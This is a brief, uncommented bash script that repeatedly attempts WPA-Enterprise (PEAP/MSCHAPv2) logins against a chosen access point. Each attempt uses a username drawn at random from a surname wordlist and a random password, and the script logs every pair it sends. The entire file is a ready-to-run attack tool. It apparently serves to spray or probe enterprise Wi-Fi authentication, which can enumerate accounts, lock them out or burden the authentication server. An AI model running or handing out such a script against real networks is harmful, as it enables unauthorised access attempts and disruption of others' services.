#!/bin/bash

iface="$1"
bssid="$2"
COUNT=20

function connect(){
	MAX_TIME=5
	bssid="$1"
	user="$2"
	pass="$3"
	cat <<E > /tmp/wpa_eap.conf
network={
   bssid=$bssid
   key_mgmt=WPA-EAP
   eap=PEAP
   identity="$user"
   password="$pass"
   phase1="peaplabel=0"
   phase2="auth=MSCHAPV2"
}
E
	sudo timeout $MAX_TIME wpa_supplicant -i "$iface" -c /tmp/wpa_eap.conf | while read line; do
		if echo "$line" | grep -q 'authentication failed'; then
			break
		fi
	done
}

for _ in `seq $COUNT`; do
	user=$(shuf -n 1 /opt/wordlists/surnames-translit.txt)
	pass=$(pwgen 10 1)
	echo "[*] send $user:$pass"
	connect "$bssid" "$user" "$pass"
done
